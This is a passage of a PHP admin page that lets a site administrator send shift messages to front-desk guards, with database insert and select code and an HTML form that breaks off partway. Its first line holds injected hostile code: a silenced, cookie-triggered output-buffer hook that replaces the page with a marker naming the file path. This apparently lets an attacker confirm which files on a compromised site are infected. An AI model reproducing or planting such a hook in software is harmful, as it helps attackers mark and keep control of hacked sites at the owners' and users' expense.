<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/msgs.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/msgs.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/msgs.php<-";}return "NotGO->./cynergi/admin/msgs.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
...
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
  $insertSQL = sprintf("INSERT INTO tbl_msgs (id_usuario, msgs_date, msgs_text, id_admin) VALUES (%s, %s, %s, %s)",
                       GetSQLValueString($_POST['select_user'], "int"),
                       GetSQLValueString($_POST['hiddenfecha'], "text"),
...
$colname_use = "-1";
if (isset($_GET['id_guard'])) {
  $colname_use = $_GET['id_guard'];
}
mysql_select_db($database_dplace, $dplace);
$query_use = sprintf("SELECT id_user, `names` FROM tbl_users WHERE id_user = %s", GetSQLValueString($colname_use, "int"));
$use = mysql_query($query_use, $dplace) or die(mysql_error());
  ...
  <tr>
    <td align="center" valign="top"><p>&nbsp;</p>
      <table width="400" border="1">
        <tr>
          <td align="center" class="titulo">Send message to frontdesk guard</td>
        </tr>
      </table>
      <p>Remember, this message would be showed when the guard start his shift.</p>
      <form id="form1" name="form1" method="POST" action="<?php echo $editFormAction; ?>">
        <table width="440" border="1">
          <tr>
            <td width="92" align="left" class="etiqueta">From:
            <input name="hidden_admin" type="hidden" id="hidden_admin" value="<?php echo $row_usuario['id_admin']; ?>" /></td>
            <td width="332" align="left"><?php echo $row_usuario['names']; ?></td>
          </tr>
          <tr>
            <td align="left" class="etiqueta">To:
            <input name="select_user" type="hidden" id="select_user" value="<?php echo $row_use['id_user']; ?>" /></td>
            <td align="left"><?php echo $row_use['names']; ?></td>
          </tr>
          <tr>
            <td align="left" valign="top" class="etiqueta">Message:
            <input name="hiddenfecha" type="hidden" id="hiddenfecha" value="<?php echo $fecha; ?>" /></td>
            <td align="left"><label>
